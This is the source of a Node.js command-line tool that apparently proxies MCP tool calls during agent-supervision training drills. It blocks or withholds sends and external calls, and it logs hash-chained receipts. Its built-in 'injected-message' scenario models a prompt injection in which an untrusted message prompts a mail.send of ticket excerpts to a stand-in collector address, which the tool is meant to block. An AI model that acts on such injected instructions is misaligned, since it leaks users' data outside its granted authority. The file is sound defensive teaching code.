#!/usr/bin/env node
import { createHash } from "node:crypto";
import { spawn } from "node:child_process";
import { appendFile, open, readFile, rename, unlink } from "node:fs/promises";
import { createInterface } from "node:readline";
import path from "node:path";
import process from "node:process";

const GENESIS = "GENESIS";
const DEFAULT_CONFIG_FILE = "bya.config.json";
const INTERNAL_METADATA_KEY = "_bya";
const READ_ONLY_OPERATIONS = new Set([
  "compare",
  "fetch",
  "get",
  "list",
  "lookup",
  "preview",
  "read",
  "search",
  "summarize",
]);
const DOMAIN_ARGUMENT_KEYS = new Set([
  "domain",
  "domains",
  "destination",
  "destinations",
  "endpoint",
  "endpoints",
  "host",
  "hostname",
  "hostnames",
  "hosts",
  "target",
  "url",
  "urls",
  "uri",
  "uris",
]);
const RECIPIENT_ARGUMENT_KEYS = new Set(["bcc", "cc", "recipient", "recipients", "to"]);
const URL_PATTERN = /https?:\/\/[^\s"'<>\\]+/giu;

const DEFAULT_CONFIG = Object.freeze({
  lessonObjective: "Practice supervising read-only data access.",
  allow: ["search", "read", "list", "lookup", "get", "compare", "preview"],
  deny: ["send", "post", "delete", "share", "publish", "transfer"],
  restrictedDomains: [],
  maxExternalRecipients: 0,
  receiptFile: "receipts.jsonl",
});

function usage() {
  return `bya-trace - MCP trace recorder for Before You Approve drills

Usage:
  bya-trace record [--config path] -- command [args...]
  bya-trace verify [--receipts path | --config path]
  bya-trace replay [--receipts path | --config path]
  bya-trace check [--config path] [--scenario injected-message]

The recorder forwards newline-delimited MCP JSON-RPC over stdio. During a local
supervision drill it evaluates tools/call requests, withholds non-allowed calls,
and writes SHA-256 chained trace receipts. "verify" checks every receipt hash
and link, but does not provide external attestation. This educational recorder
is not a production security boundary.`;
}

function isRecord(value) {
  return value !== null && typeof value === "object" && !Array.isArray(value);
}

function canonicalJson(value) {
  if (value === null || typeof value !== "object") return JSON.stringify(value);
  if (Array.isArray(value)) return `[${value.map(canonicalJson).join(",")}]`;
  return `{${Object.keys(value)
    .sort()
    .map((key) => `${JSON.stringify(key)}:${canonicalJson(value[key])}`)
    .join(",")}}`;
}

function hash(value) {
  return createHash("sha256").update(value).digest("hex");
}

function sha256Json(value) {
  return hash(canonicalJson(value));
}

function stringArray(value, name) {
  if (!Array.isArray(value) || value.some((item) => typeof item !== "string")) {
    throw new Error(`Config field ${name} must be an array of strings`);
  }
  return value.map((item) => item.toLowerCase());
}

function normalizedArgumentKey(key) {
  return key.toLowerCase().replace(/[^a-z0-9]/g, "");
}

function normalizeHostname(value, { requireDomainShape = false } = {}) {
  if (typeof value !== "string") return null;
  const candidate = value.trim().toLowerCase().replace(/^\.+|\.+$/g, "");
  if (!candidate || /[\s/@?#]/.test(candidate)) return null;
  if (requireDomainShape && !candidate.includes(".") && candidate !== "localhost") return null;

  try {
    const hostname = new URL(`https://${candidate}`).hostname.toLowerCase().replace(/\.$/, "");
    return hostname || null;
  } catch {
    return null;
  }
}

function hostnameFromUrl(value) {
  try {
    const url = new URL(value);
    if (url.protocol !== "http:" && url.protocol !== "https:") return null;
    return url.hostname.toLowerCase().replace(/\.$/, "") || null;
  } catch {
    return null;
  }
}

function normalizeRestrictedDomains(value) {
  const domains = stringArray(value, "restrictedDomains").map((domain) => normalizeHostname(domain));
  if (domains.some((domain) => domain === null)) {
    throw new Error("Config field restrictedDomains must contain hostnames, not URLs or paths");
  }
  return [...new Set(domains)];
}

function normalizeConfig(rawConfig, baseDirectory) {
  if (!isRecord(rawConfig)) throw new Error("Config must contain a JSON object");
  const merged = { ...DEFAULT_CONFIG, ...rawConfig };
  const lessonObjective = rawConfig.lessonObjective ?? rawConfig.intent ?? DEFAULT_CONFIG.lessonObjective;
  if (typeof lessonObjective !== "string" || !lessonObjective.trim()) {
    throw new Error("Config field lessonObjective must be a non-empty string");
  }
  if (!Number.isSafeInteger(merged.maxExternalRecipients) || merged.maxExternalRecipients < 0) {
    throw new Error("Config field maxExternalRecipients must be a non-negative integer");
  }
  if (typeof merged.receiptFile !== "string" || !merged.receiptFile.trim()) {
    throw new Error("Config field receiptFile must be a non-empty path");
  }
  return {
    lessonObjective,
    allow: stringArray(merged.allow, "allow"),
    deny: stringArray(merged.deny, "deny"),
    restrictedDomains: normalizeRestrictedDomains(merged.restrictedDomains),
    maxExternalRecipients: merged.maxExternalRecipients,
    receiptFile: path.resolve(baseDirectory, merged.receiptFile),
  };
}

async function loadConfig(configPath) {
  const explicitPath = configPath ? path.resolve(configPath) : null;
  const resolvedPath = explicitPath ?? path.resolve(DEFAULT_CONFIG_FILE);
  try {
    const parsed = JSON.parse(await readFile(resolvedPath, "utf8"));
    return normalizeConfig(parsed, path.dirname(resolvedPath));
  } catch (error) {
    if (!explicitPath && error?.code === "ENOENT") {
      return normalizeConfig(DEFAULT_CONFIG, process.cwd());
    }
    if (error instanceof SyntaxError) throw new Error(`Invalid JSON in ${resolvedPath}: ${error.message}`);
    throw error;
  }
}

function normalizeTrust(value) {
  return ["trusted", "untrusted", "restricted", "unknown"].includes(value) ? value : "unknown";
}

function inspectArgumentDestinations(args) {
  const externalHosts = new Set();
  const recipientValues = new Set();
  let declaredRecipientCount = 0;
  let external = false;

  const addRecipient = (value) => {
    if (typeof value !== "string" || !value.trim()) return;
    recipientValues.add(value.trim().toLowerCase());
    external = true;
    for (const match of value.matchAll(/@[a-z0-9.-]+/giu)) {
      const hostname = normalizeHostname(match[0].slice(1));
      if (hostname) externalHosts.add(hostname);
    }
  };

  const visit = (value, parentKey = "") => {
    if (Array.isArray(value)) {
      for (const item of value) visit(item, parentKey);
      return;
    }
    if (isRecord(value)) {
      for (const [key, nestedValue] of Object.entries(value)) {
        if (key === INTERNAL_METADATA_KEY) continue;
        visit(nestedValue, normalizedArgumentKey(key));
      }
      return;
    }

    if (parentKey === "external" && value === true) external = true;
    if (parentKey === "recipientcount") {
      const parsed = Number(value);
      declaredRecipientCount =
        Number.isSafeInteger(parsed) && parsed >= 0
          ? Math.max(declaredRecipientCount, parsed)
          : Number.MAX_SAFE_INTEGER;
    }
    if (RECIPIENT_ARGUMENT_KEYS.has(parentKey)) addRecipient(value);
    if (typeof value !== "string") return;

    let sawUrl = false;
    for (const match of value.matchAll(URL_PATTERN)) {
      sawUrl = true;
      const hostname = hostnameFromUrl(match[0].replace(/[),.;!?]+$/u, ""));
      if (hostname) externalHosts.add(hostname);
    }
    if (sawUrl) external = true;

    if (DOMAIN_ARGUMENT_KEYS.has(parentKey)) {
      for (const match of value.matchAll(/@[a-z0-9.-]+/giu)) {
        const emailHostname = normalizeHostname(match[0].slice(1));
        if (emailHostname) {
          external = true;
          externalHosts.add(emailHostname);
        }
      }
      const hostname = hostnameFromUrl(value) ?? normalizeHostname(value, { requireDomainShape: true });
      if (hostname) {
        external = true;
        externalHosts.add(hostname);
      }
    }
  };

  visit(args);
  return {
    external: external || externalHosts.size > 0,
    externalHosts: [...externalHosts].sort(),
    recipientCount: Math.max(declaredRecipientCount, recipientValues.size),
  };
}

function deriveAction(request) {
  const params = isRecord(request.params) ? request.params : {};
  const args = isRecord(params.arguments) ? params.arguments : {};
  const metadata = isRecord(args[INTERNAL_METADATA_KEY]) ? args[INTERNAL_METADATA_KEY] : {};
  const tool = String(params.name ?? "unknown");
  const toolOperation = String(tool.split(/[./:]/).filter(Boolean).at(-1) ?? "unknown").trim().toLowerCase();
  const operation = String(args.operation ?? toolOperation).trim().toLowerCase();
  const target = String(args.target ?? args.recipient ?? args.url ?? args.path ?? "unspecified");
  const destinations = inspectArgumentDestinations(args);
  const external = destinations.external || metadata.external === true;
  // A caller-provided operation label cannot make an unknown tool read-only.
  const mutation =
    !READ_ONLY_OPERATIONS.has(operation) ||
    !READ_ONLY_OPERATIONS.has(toolOperation) ||
    args.mutation === true ||
    metadata.mutation === true;
  const provenance = isRecord(metadata.provenance) ? metadata.provenance : {};

  return {
    requestId: request.id ?? null,
    tool,
    operation,
    target,
    effect: String(metadata.effect ?? `${operation} via ${tool} targeting ${target}`),
    external,
    externalHosts: destinations.externalHosts,
    mutation,
    recipientCount: destinations.recipientCount,
    provenance: {
      source: typeof provenance.source === "string" ? provenance.source : "agent request",
      trust: normalizeTrust(provenance.trust),
    },
  };
}

function evaluate(config, action) {
  const tool = action.tool.toLowerCase();
  const denied = config.deny.some((word) => tool.includes(word) || action.operation === word);
  const explicitlyAllowed = config.allow.some((word) => tool.includes(word) || action.operation === word);
  const restricted = action.externalHosts.some((hostname) =>
    config.restrictedDomains.some((domain) => hostname === domain || hostname.endsWith(`.${domain}`)),
  );
  const recipientOverflow = action.recipientCount > config.maxExternalRecipients;
  const untrustedMutation = ["untrusted", "restricted"].includes(action.provenance.trust) && action.mutation;

  if (denied || restricted || recipientOverflow || (action.external && action.mutation) || untrustedMutation) {
    return {
      decision: "blocked",
      reason: untrustedMutation
        ? "Consequential authority originated in untrusted or restricted content."
        : "The requested effect exceeds the configured authority.",
      risk: action.external ? "data_egress" : "policy_violation",
    };
  }

  if (explicitlyAllowed && !action.mutation) {
    return {
      decision: "allowed",
      reason: "The action is read-only and matches an explicitly allowed capability.",
      risk: "read_only",
    };
  }

  return {
    decision: "review",
    reason: "The policy does not grant enough authority to forward this action without human review.",
    risk: action.mutation ? "side_effect" : "unscoped_action",
  };
}

function stripInternalMetadata(value) {
  if (Array.isArray(value)) return value.map(stripInternalMetadata);
  if (!isRecord(value)) return value;
  return Object.fromEntries(
    Object.entries(value)
      .filter(([key]) => key !== INTERNAL_METADATA_KEY)
      .map(([key, nestedValue]) => [key, stripInternalMetadata(nestedValue)]),
  );
}

function policyFingerprint(config) {
  return sha256Json({
    allow: config.allow,
    deny: config.deny,
    restrictedDomains: config.restrictedDomains,
    maxExternalRecipients: config.maxExternalRecipients,
  });
}

function buildReceipt(config, action, evaluation, previousHash, sequence) {
  const allowed = evaluation.decision === "allowed";
  const body = {
    version: 1,
    sequence,
    recordedAt: new Date().toISOString(),
    algorithm: "sha256",
    lessonObjectiveHash: hash(config.lessonObjective),
    policyHash: policyFingerprint(config),
    action,
    evaluation,
    enforcement: {
      requestForwarding: allowed ? "authorized" : "withheld",
      downstreamOutcome: allowed ? "not_observed" : "not_applicable",
    },
    previousHash,
  };
  return { ...body, receiptHash: sha256Json(body) };
}

function verifyReceiptRecords(contents) {
  const lines = contents.split(/\r?\n/).filter((line) => line.trim());
  const receipts = [];
  let previousHash = GENESIS;

  for (const [index, line] of lines.entries()) {
    let receipt;
    try {
      receipt = JSON.parse(line);
    } catch (error) {
      throw new Error(`Receipt line ${index + 1} is not valid JSON: ${error.message}`);
    }
    if (!isRecord(receipt)) throw new Error(`Receipt line ${index + 1} must contain an object`);
    if (receipt.version !== 1 || receipt.algorithm !== "sha256") {
      throw new Error(`Receipt line ${index + 1} uses an unsupported format`);
    }
    if (receipt.sequence !== index + 1) {
      throw new Error(`Receipt line ${index + 1} has sequence ${String(receipt.sequence)}; expected ${index + 1}`);
    }
    if (receipt.previousHash !== previousHash) {
      throw new Error(`Receipt line ${index + 1} does not link to the previous receipt`);
    }
    if (typeof receipt.receiptHash !== "string" || !/^[a-f0-9]{64}$/.test(receipt.receiptHash)) {
      throw new Error(`Receipt line ${index + 1} has an invalid SHA-256 hash`);
    }
    const { receiptHash, ...body } = receipt;
    if (sha256Json(body) !== receiptHash) {
      throw new Error(`Receipt line ${index + 1} failed its SHA-256 integrity check`);
    }
    receipts.push(receipt);
    previousHash = receiptHash;
  }

  return { count: lines.length, headHash: previousHash, receipts };
}

async function inspectReceiptFile(receiptFile, { allowMissing = false } = {}) {
  const resolvedPath = path.resolve(receiptFile);
  try {
    const result = verifyReceiptRecords(await readFile(resolvedPath, "utf8"));
    return { ...result, receiptFile: resolvedPath };
  } catch (error) {
    if (allowMissing && error?.code === "ENOENT") {
      return { count: 0, headHash: GENESIS, receiptFile: resolvedPath };
    }
    throw error;
  }
}

async function acquireReceiptLock(receiptFile) {
  const lockFile = `${path.resolve(receiptFile)}.lock`;
  let handle = null;

  for (let attempt = 0; attempt < 3 && handle === null; attempt += 1) {
    try {
      handle = await open(lockFile, "wx", 0o600);
      await handle.writeFile(`${JSON.stringify({ pid: process.pid, startedAt: new Date().toISOString() })}\n`);
    } catch (error) {
      if (handle) {
        await handle.close();
        handle = null;
        try {
          await unlink(lockFile);
        } catch (cleanupError) {
          if (cleanupError?.code !== "ENOENT") throw cleanupError;
        }
      }
      if (error?.code !== "EEXIST") throw error;

      let owner;
      try {
        owner = JSON.parse(await readFile(lockFile, "utf8"));
      } catch {
        throw new Error(`Receipt chain lock is unreadable; inspect it before removal: ${lockFile}`);
      }

      const ownerPid = Number(owner?.pid);
      let ownerAlive = Number.isSafeInteger(ownerPid) && ownerPid > 0;
      if (ownerAlive) {
        try {
          process.kill(ownerPid, 0);
        } catch (signalError) {
          if (signalError?.code === "ESRCH") ownerAlive = false;
          else if (signalError?.code !== "EPERM") throw signalError;
        }
      }
      if (ownerAlive) throw new Error(`Receipt chain is already in use by process ${ownerPid}: ${lockFile}`);

      const staleFile = `${lockFile}.stale-${process.pid}-${Date.now()}`;
      try {
        await rename(lockFile, staleFile);
        await unlink(staleFile);
      } catch (reclaimError) {
        if (reclaimError?.code !== "ENOENT") throw reclaimError;
      }
    }
  }

  if (!handle) throw new Error(`Could not acquire receipt chain lock after reclaiming stale state: ${lockFile}`);

  let released = false;
  return async () => {
    if (released) return;
    released = true;
    await handle.close();
    try {
      await unlink(lockFile);
    } catch (error) {
      if (error?.code !== "ENOENT") throw error;
    }
  };
}

function withheldResponse(request, receipt) {
  const { decision, reason, risk } = receipt.evaluation;
  const verb = decision === "blocked" ? "blocked" : "withheld for review";
  return {
    jsonrpc: "2.0",
    id: request.id ?? null,
    result: {
      content: [{ type: "text", text: `Before You Approve marked ${receipt.action.tool} as ${verb} in this drill: ${reason}` }],
      structuredContent: {
        decision,
        risk,
        receiptHash: receipt.receiptHash,
        forwardedToServer: false,
        sideEffectsOccurred: false,
      },
      isError: true,
    },
  };
}

function protocolError(code, message) {
  return { jsonrpc: "2.0", id: null, error: { code, message } };
}

function writeToStream(stream, data) {
  return new Promise((resolve, reject) => {
    if (stream.destroyed || !stream.writable) {
      reject(new Error("MCP stream is not writable"));
      return;
    }
    stream.write(data, (error) => (error ? reject(error) : resolve()));
  });
}

function waitForChild(child) {
  return new Promise((resolve) => {
    child.once("close", (code, signal) => resolve({ code, signal }));
  });
}

async function terminateChild(child, childExit) {
  if (child.exitCode !== null || child.signalCode !== null) return childExit;
  child.kill("SIGTERM");
  const result = await Promise.race([
    childExit,
    new Promise((resolve) => setTimeout(() => resolve(null), 1_000)),
  ]);
  if (result) return result;
  child.kill("SIGKILL");
  return childExit;
}

async function runProxy(config, command) {
  if (!command.length) throw new Error("Missing MCP server command after --");
  const releaseReceiptLock = await acquireReceiptLock(config.receiptFile);
  try {
    await runLockedProxy(config, command);
  } finally {
    await releaseReceiptLock();
  }
}

async function runLockedProxy(config, command) {
  const chain = await inspectReceiptFile(config.receiptFile, { allowMissing: true });
  let previousHash = chain.headHash;
  let sequence = chain.count;
  const child = spawn(command[0], command.slice(1), { stdio: ["pipe", "pipe", "inherit"] });
  await new Promise((resolve, reject) => {
    child.once("spawn", resolve);
    child.once("error", reject);
  });

  child.stdin.on("error", () => {});
  const childExit = waitForChild(child);
  const input = createInterface({ input: process.stdin, crlfDelay: Infinity });
  const childOutput = createInterface({ input: child.stdout, crlfDelay: Infinity });
  let inputEnded = false;
  let receivedSignal = null;
  let outputFailure = null;
  let outputQueue = Promise.resolve();

  const enqueueOutput = (data) => {
    const write = outputQueue.then(() => writeToStream(process.stdout, data));
    outputQueue = write.catch(() => {});
    return write;
  };
  const childOutputTask = (async () => {
    for await (const line of childOutput) await enqueueOutput(`${line}\n`);
  })().catch((error) => {
    outputFailure = error;
    child.kill("SIGTERM");
    input.close();
  });

  const signalHandlers = new Map(
    ["SIGINT", "SIGTERM", "SIGHUP"].map((signal) => [
      signal,
      () => {
        receivedSignal = signal;
        child.kill(signal);
        input.close();
      },
    ]),
  );
  for (const [signal, handler] of signalHandlers) process.once(signal, handler);
  process.stdin.once("end", () => {
    inputEnded = true;
  });
  child.once("close", () => {
    if (!inputEnded) input.close();
  });

  try {
    for await (const line of input) {
      if (!line.trim()) continue;
      let message;
      try {
        message = JSON.parse(line);
      } catch {
        await enqueueOutput(`${JSON.stringify(protocolError(-32700, "Invalid JSON in MCP drill trace"))}\n`);
        continue;
      }

      if (!isRecord(message)) {
        await enqueueOutput(`${JSON.stringify(protocolError(-32600, "MCP drill messages must be JSON objects"))}\n`);
        continue;
      }

      if (message.method !== "tools/call") {
        await writeToStream(child.stdin, `${JSON.stringify(stripInternalMetadata(message))}\n`);
        continue;
      }

      const action = deriveAction(message);
      const evaluation = evaluate(config, action);
      const receipt = buildReceipt(config, action, evaluation, previousHash, sequence + 1);
      await appendFile(config.receiptFile, `${JSON.stringify(receipt)}\n`, { mode: 0o600 });
      previousHash = receipt.receiptHash;
      sequence += 1;

      if (evaluation.decision === "allowed") {
        const sanitized = stripInternalMetadata(message);
        await writeToStream(child.stdin, `${JSON.stringify(sanitized)}\n`);
      } else if (message.id !== undefined) {
        await enqueueOutput(`${JSON.stringify(withheldResponse(message, receipt))}\n`);
      }
    }

    if (!child.stdin.destroyed) child.stdin.end();
    const result = await childExit;
    await childOutputTask;
    await outputQueue;
    if (outputFailure) throw outputFailure;
    if (receivedSignal) {
      process.exitCode = 128 + (receivedSignal === "SIGINT" ? 2 : receivedSignal === "SIGTERM" ? 15 : 1);
      return;
    }
    if (result.signal) throw new Error(`MCP drill server exited after signal ${result.signal}`);
    if (result.code !== 0) {
      process.stderr.write(`bya-trace: MCP drill server exited with code ${result.code}\n`);
      process.exitCode = result.code ?? 1;
    }
  } catch (error) {
    await terminateChild(child, childExit);
    await childOutputTask;
    await outputQueue;
    throw error;
  } finally {
    input.close();
    childOutput.close();
    for (const [signal, handler] of signalHandlers) process.removeListener(signal, handler);
  }
}

async function runCheck(config, scenario) {
  if (scenario !== "injected-message") throw new Error(`Unknown scenario: ${scenario}`);
  const request = {
    jsonrpc: "2.0",
    id: 1842,
    method: "tools/call",
    params: {
      name: "mail.send",
      arguments: {
        operation: "send",
        recipient: "collector@audit-gateway.example",
        recipientCount: 1,
        external: true,
        _bya: {
          effect: "Send three synthetic ticket excerpts to audit-gateway.example",
          provenance: { source: "untrusted message #1842", trust: "untrusted" },
        },
      },
    },
  };
  const action = deriveAction(request);
  const evaluation = evaluate(config, action);
  const receipt = buildReceipt(config, action, evaluation, GENESIS, 1);
  process.stdout.write(`${JSON.stringify({ lessonObjective: config.lessonObjective, action, evaluation, receipt }, null, 2)}\n`);
  process.exitCode = evaluation.decision === "blocked" ? 0 : 1;
}

function parseOptions(args, allowedOptions) {
  const options = new Map();
  const positional = [];
  for (let index = 0; index < args.length; index += 1) {
    const token = args[index];
    if (!token.startsWith("--")) {
      positional.push(token);
      continue;
    }
    if (!allowedOptions.has(token)) throw new Error(`Unknown option: ${token}`);
    const value = args[index + 1];
    if (!value || value.startsWith("--")) throw new Error(`Missing value for ${token}`);
    options.set(token, value);
    index += 1;
  }
  return { options, positional };
}

async function runVerify(receiptFile) {
  try {
    const { receipts: _receipts, ...report } = await inspectReceiptFile(receiptFile);
    process.stdout.write(`${JSON.stringify({
      valid: true,
      integrity: "self_consistent",
      externallyAnchored: false,
      ...report,
    })}\n`);
  } catch (error) {
    process.stdout.write(`${JSON.stringify({ valid: false, receiptFile: path.resolve(receiptFile), error: error.message })}\n`);
    process.exitCode = 1;
  }
}

async function runReplay(receiptFile) {
  const report = await inspectReceiptFile(receiptFile);
  const events = report.receipts.map((receipt) => ({
    sequence: receipt.sequence,
    recordedAt: receipt.recordedAt,
    tool: receipt.action.tool,
    effect: receipt.action.effect,
    decision: receipt.evaluation.decision,
    reason: receipt.evaluation.reason,
    requestForwarding: receipt.enforcement.requestForwarding,
    downstreamOutcome: receipt.enforcement.downstreamOutcome,
    receiptHash: receipt.receiptHash,
  }));
  process.stdout.write(`${JSON.stringify({
    valid: true,
    integrity: "self_consistent",
    externallyAnchored: false,
    receiptFile: report.receiptFile,
    count: report.count,
    headHash: report.headHash,
    events,
  })}\n`);
}

async function receiptPathFromOptions(args, mode) {
  const { options, positional } = parseOptions(args, new Set(["--config", "--receipts"]));
  if (positional.length) throw new Error(`Unexpected ${mode} argument: ${positional[0]}`);
  if (options.has("--config") && options.has("--receipts")) {
    throw new Error("Use either --config or --receipts, not both");
  }
  return options.get("--receipts") ?? (await loadConfig(options.get("--config"))).receiptFile;
}

async function main() {
  const [mode, ...args] = process.argv.slice(2);
  if (!mode || mode === "--help" || mode === "-h") {
    process.stdout.write(`${usage()}\n`);
    return;
  }

  if (mode === "record" || mode === "proxy") {
    const separator = args.indexOf("--");
    if (separator < 0) throw new Error("Missing -- before the MCP server command");
    const { options, positional } = parseOptions(args.slice(0, separator), new Set(["--config"]));
    if (positional.length) throw new Error(`Unexpected record argument: ${positional[0]}`);
    const config = await loadConfig(options.get("--config"));
    await runProxy(config, args.slice(separator + 1));
    return;
  }

  if (mode === "verify") {
    await runVerify(await receiptPathFromOptions(args, mode));
    return;
  }

  if (mode === "replay") {
    await runReplay(await receiptPathFromOptions(args, mode));
    return;
  }

  if (mode === "check") {
    const { options, positional } = parseOptions(args, new Set(["--config", "--scenario"]));
    if (positional.length) throw new Error(`Unexpected check argument: ${positional[0]}`);
    const config = await loadConfig(options.get("--config"));
    await runCheck(config, options.get("--scenario") ?? "injected-message");
    return;
  }

  throw new Error(`Unknown mode: ${mode}\n\n${usage()}`);
}

main().catch((error) => {
  process.stderr.write(`bya-trace error: ${error.message}\n`);
  process.exitCode = 1;
});
